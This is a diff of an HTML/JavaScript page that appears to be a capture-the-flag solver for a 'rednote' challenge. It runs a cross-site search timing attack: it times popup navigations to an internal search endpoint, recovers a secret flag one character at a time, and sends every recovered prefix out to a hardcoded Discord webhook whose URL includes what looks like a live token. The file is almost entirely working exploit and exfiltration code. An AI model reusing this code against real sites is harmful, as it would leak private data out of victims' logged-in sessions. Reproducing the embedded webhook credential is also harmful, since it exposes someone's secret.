@@ -1,93 +1,144 @@
 <!doctype html>
-<meta charset="utf-8">
+<meta charset="utf-8" />
 <title>rednote XS-Search solver</title>
-<pre id=log>starting…</pre>
+<style>
+  body { font: 14px/1.5 system-ui, -apple-system, Segoe UI, Roboto, Arial; max-width: 900px; margin: 2rem auto; }
+  pre  { background:#f6f6f6; border-radius:10px; padding:14px; }
+  .ok  { color:#0a7 } .warn{ color:#d70 } .err{ color:#d33 }
+</style>
+<pre id="log">starting…</pre>
 <script>
-/* ===== CONFIG ===== */
-const ORIGIN = "http://rednote:1337";
+/* =========================== CONFIG =========================== */
+const ORIGIN      = "http://rednote:1337";     // internal host the admin uses
 const SEARCH_PATH = "/search?query=";
-// Flag charset from hint in the challenge: SEKAI{[a-z_]+}
-const CHARSET = "abcdefghijklmnopqrstuvwxyz_";
-const PREFIX = "SEKAI{";
-const SUFFIX = "}";
-// Rate-limit friendly pacing (4 per 4s == 1/sec); keep a small buffer:
-const SLEEP_MS = 1100;
 
-/* ===== helpers ===== */
-const log = (...a)=> document.getElementById('log').textContent += a.join(' ') + "\n";
+// flag format: SEKAI{[a-z_]+}
+const START_PREFIX = "SEKAI{";
+const STOP_CHAR    = "}";
+
+// Try '}' first, then frequency-ordered english letters, then '_'
+const ORDERED_CHARS = [
+  "}", "e","t","a","o","i","n","s","r","h","d","l","c","u","m",
+  "w","f","g","y","p","b","v","k","j","x","q","z","_"
+];
+
+// Rate limit is 4 req / 4s keyed to the admin → ~1/sec.
+const PACE_MS       = 1050;              // keep a small safety margin
+const MAX_CHARS     = 64;                // hard cap so we don't loop forever
+
+// >>> Your Discord webhook (sent as JSON {"content": "..."}):
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1382334613845840002/SX5hbHiHJO3xp5CsBGhgsPNzWfMEOagKkW8lr7ESxZfSzO718u1UNKm-YFk8EpxaDgVI";
+
+/* ======================== small helpers ======================= */
+const $log = document.getElementById("log");
+const log  = (...a)=>($log.textContent += a.join(" ") + "\n");
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
-function openVictimWindow() {
+function openVictimPopup() {
   const w = window.open("about:blank", "victim", "width=900,height=700");
-  if (!w) throw new Error("Popup blocked");
+  if (!w) throw new Error("Popup blocked; allow popups for this page.");
   return w;
 }
 
 async function timeNav(win, url) {
-  return await new Promise((resolve) => {
+  return await new Promise(resolve => {
     const start = performance.now();
-    // attach onload before navigation (works cross-origin)
     win.onload = () => resolve(performance.now() - start);
-    // navigate (top-level => SameSite=Lax cookie is sent)
     win.location = url + (url.includes("?") ? "&" : "?") + "_t=" + Math.random();
   });
 }
 
-/* Calibrate which side is slower/faster: a “hit” (flag substring present) vs “miss”. */
-async function calibrate(win) {
-  // A likely HIT: just the known prefix "SEKAI{"
-  const tHit = await timeNav(win, ORIGIN + SEARCH_PATH + encodeURIComponent(PREFIX));
-  await sleep(SLEEP_MS);
-  // A guaranteed MISS
-  const tMiss = await timeNav(win, ORIGIN + SEARCH_PATH + encodeURIComponent("__definitely_not_in_flag__"));
-  await sleep(SLEEP_MS);
-
-  log(`calibration → HIT=${tHit.toFixed(1)}ms, MISS=${tMiss.toFixed(1)}ms`);
-  // If note page is heavier, HIT will usually be slower. Flip comparator if needed.
-  const hitIf = (t) => (tHit > tMiss) ? (t > (tHit + tMiss)/2) : (t < (tHit + tMiss)/2);
-  return hitIf;
-}
-
-async function solve() {
-  const win = openVictimWindow();
-  log("popup opened; starting…");
-
-  const isHit = await calibrate(win);
-
-  let flag = PREFIX;
-  outer: for (let i = 0; i < 64; i++) {
-    let found = null, bestT = Infinity, rec = [];
-
-    for (const ch of CHARSET) {
-      const q = flag + ch;
-      const t = await timeNav(win, ORIGIN + SEARCH_PATH + encodeURIComponent(q));
-      rec.push([ch, t]);
-      await sleep(SLEEP_MS);
-
-      // pick the char whose timing looks like the calibrated “HIT”
-      if (isHit(t)) {
-        found = ch;
-        bestT = t;
-        break;
-      }
-    }
-
-    if (!found) {
-      // As a fallback (noise), pick the fastest one
-      rec.sort((a,b)=>a[1]-b[1]);
-      found = rec[0][0];
-      bestT = rec[0][1];
-    }
-
-    flag += found;
-    log(`→ ${flag}  (picked '${found}' @ ${bestT.toFixed(1)}ms)`);
-    if (found === "}" || flag.endsWith(SUFFIX)) break outer;
+/* ===================== Discord exfil helpers ================== */
+function sendDiscord(text) {
+  const payload = JSON.stringify({ content: text });
+  const blob = new Blob([payload], { type: "application/json" });
+  // sendBeacon first (no CORS preflight), then fetch fallback
+  const ok = navigator.sendBeacon(DISCORD_WEBHOOK, blob);
+  if (!ok) {
+    fetch(DISCORD_WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: payload,
+      keepalive: true,
+    }).catch(()=>{});
   }
-
-  log("\nFINAL:", flag);
-  // send to your catcher if desired:
-  // navigator.sendBeacon("https://en0phinx.requestcatcher.com/flag", flag);
 }
 
-solve().catch(e => log("error:", e));
+/* ================ calibration & oracle direction =============== */
+async function calibrate(win) {
+  // A definite HIT: the known prefix exists inside the flag note
+  const hitQ = START_PREFIX;
+  const tH1 = await timeNav(win, ORIGIN + SEARCH_PATH + encodeURIComponent(hitQ));
+  await sleep(PACE_MS);
+  const tH2 = await timeNav(win, ORIGIN + SEARCH_PATH + encodeURIComponent(hitQ));
+  await sleep(PACE_MS);
+  const tHit = Math.min(tH1, tH2);    // conservative
+
+  // A definite MISS: nonsense
+  const missQ = "__not_present__";
+  const tM1 = await timeNav(win, ORIGIN + SEARCH_PATH + encodeURIComponent(missQ));
+  await sleep(PACE_MS);
+  const tM2 = await timeNav(win, ORIGIN + SEARCH_PATH + encodeURIComponent(missQ));
+  await sleep(PACE_MS);
+  const tMiss = Math.min(tM1, tM2);
+
+  const hitIsSlower = tHit > tMiss;
+  const threshold   = (tHit + tMiss) / 2;
+  log(`calibration → HIT≈${tHit.toFixed(1)}ms  MISS≈${tMiss.toFixed(1)}ms  → hitIsSlower=${hitIsSlower}`);
+  return { hitIsSlower, threshold };
+}
+
+function makeHitTest(threshold, hitIsSlower) {
+  return (t) => hitIsSlower ? (t > threshold) : (t < threshold);
+}
+
+/* ========================== main logic ======================== */
+async function solve() {
+  try {
+    const win = openVictimPopup();
+    log("popup opened; beginning leak…");
+
+    const { hitIsSlower, threshold } = await calibrate(win);
+    const isHit = makeHitTest(threshold, hitIsSlower);
+
+    let flag = START_PREFIX;
+    sendDiscord(`[bluenote] start: ${flag}`);
+
+    outer: for (let i = 0; i < MAX_CHARS; i++) {
+      let chosen = null;
+      let rec = [];
+
+      for (const ch of ORDERED_CHARS) {
+        const q = flag + ch;
+        const t = await timeNav(win, ORIGIN + SEARCH_PATH + encodeURIComponent(q));
+        await sleep(PACE_MS);
+        rec.push([ch, t]);
+
+        if (isHit(t)) { chosen = ch; break; }   // found the next char
+      }
+
+      if (!chosen) {
+        // noisy fallback: pick best candidate based on calibrated direction
+        rec.sort((a,b)=>a[1]-b[1]);
+        chosen = hitIsSlower ? rec.at(-1)[0] : rec[0][0];
+        log(".warn noisy step, fallback picked:", chosen, JSON.stringify(rec.map(([c,t])=>[c, t.toFixed(0)])));
+      }
+
+      flag += chosen;
+      log(".ok →", flag, `(picked '${chosen}')`);
+      sendDiscord(`[bluenote] progress: ${flag}`);
+
+      if (chosen === STOP_CHAR || flag.endsWith(STOP_CHAR)) break outer;
+    }
+
+    log("\nFINAL:", flag);
+    sendDiscord(`[bluenote] FINAL: ${flag}`);
+
+  } catch (e) {
+    log(".err", e && (e.stack || e));
+    sendDiscord(`[bluenote] error: ${e && (e.message || e)}`);
+  }
+}
+
+solve();
 </script>
